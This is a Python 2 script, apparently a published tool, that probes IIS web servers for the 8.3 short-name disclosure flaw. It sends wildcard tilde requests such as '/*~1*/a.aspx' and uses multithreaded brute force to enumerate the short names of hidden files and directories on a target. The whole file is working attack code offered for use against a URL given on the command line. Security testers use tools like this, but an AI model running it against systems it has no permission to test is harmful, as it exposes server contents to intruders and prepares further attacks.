#!/usr/bin/env python
# encoding:utf-8
# An IIS short_name scanner   my[at]lijiejie.com  http://www.lijiejie.com    


import sys
import httplib
import urlparse
import threading
import Queue
import time


class Scanner():
    def __init__(self, target):
        self.target = target.lower()
        if not self.target.startswith('http'):
            self.target = 'http://%s' % self.target
        self.scheme, self.netloc, self.path, params, query, fragment = \
                     urlparse.urlparse(target)
        if self.path[-1:] != '/':    # ends with slash
            self.path += '/'
        self.alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
        self.files = []
        self.dirs = []
        self.queue = Queue.Queue()
        self.lock = threading.Lock()
        self.threads = []
        self.request_method = ''
        self.msg_queue = Queue.Queue()
        self.STOP_ME = False
        threading.Thread(target=self._print).start()

    def _conn(self):
        try:
            if self.scheme == 'https':
                conn = httplib.HTTPSConnection(self.netloc)
            else:
                conn = httplib.HTTPConnection(self.netloc)
            return conn
        except Exception, e:
            print '[_conn.Exception]', e
            return None

    def _get_status(self, path):
        try:
            conn = self._conn()
            conn.request(self.request_method, path)
            status = conn.getresponse().status
            conn.close()
            return status
        except Exception, e:
            raise Exception('[_get_status.Exception] %s' % str(e) )

    def is_vul(self):
        try:
            for _method in ['GET', 'OPTIONS']:
                self.request_method = _method
                status_1 = self._get_status(self.path + '/*~1*/a.aspx')    # an existed file/folder
                status_2 = self._get_status(self.path + '/l1j1e*~1*/a.aspx')    # not existed file/folder
                if status_1 == 404 and status_2 != 404:
                    return True
            return  False
        except Exception, e:
            raise Exception('[is_vul.Exception] %s' % str(e) )

    def run(self):
        for c in self.alphanum:
            self.queue.put( (self.path + c, '.*') )    # filename, extension
        for i in range(20):
            t = threading.Thread(target=self._scan_worker)
            self.threads.append(t)
            t.start()
        for t in self.threads:
            t.join()
        self.STOP_ME = True

    def report(self):
        print '-'* 64
        for d in self.dirs:
            print 'Dir:  %s' % d
        for f in self.files:
            print 'File: %s' % f
        print '-'*64
        print '%d Directories, %d Files found in total' % (len(self.dirs), len(self.files))
        print 'Note that * is a wildcard, matches any character zero or more times.'

    def _print(self):
        while not self.STOP_ME or (not self.msg_queue.empty()):
            if self.msg_queue.empty():
                time.sleep(0.05)
            else:
                print self.msg_queue.get()

    def _scan_worker(self):
        while True:
            try:
                url, ext = self.queue.get(timeout=1.0)
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    self.msg_queue.put('[+] %s~1%s\t[scan in progress]' % (url, ext))

                    if len(url) - len(self.path)< 6:    # enum first 6 chars only
                        for c in self.alphanum:
                            self.queue.put( (url + c, ext) )
                    else:
                        if ext == '.*':
                            self.queue.put( (url, '') )

                        if ext == '':
                            self.dirs.append(url + '~1')
                            self.msg_queue.put('[+] Directory ' +  url + '~1\t[Done]')

                        elif len(ext) == 5 or (not ext.endswith('*')):    # .asp*
                            self.files.append(url + '~1' + ext)
                            self.msg_queue.put('[+] File ' + url + '~1' + ext + '\t[Done]')

                        else:
                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                                self.queue.put( (url, ext[:-1] + c + '*') )
                                if len(ext) < 4:    # < len('.as*')
                                    self.queue.put( (url, ext[:-1] + c) )

            except Queue.Empty,e:
                break
            except Exception, e:
                print '[Exception]', e


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print 'Usage: python IIS_shortname_Scan.py http://www.target.com/'
        sys.exit()

    target = sys.argv[1]
    s = Scanner(target)
    if not s.is_vul():
        s.STOP_ME = True
        print 'Server is not vulnerable'
        sys.exit(0)

    print 'Server is vulnerable, please wait, scanning...'
    s.run()
    s.report()
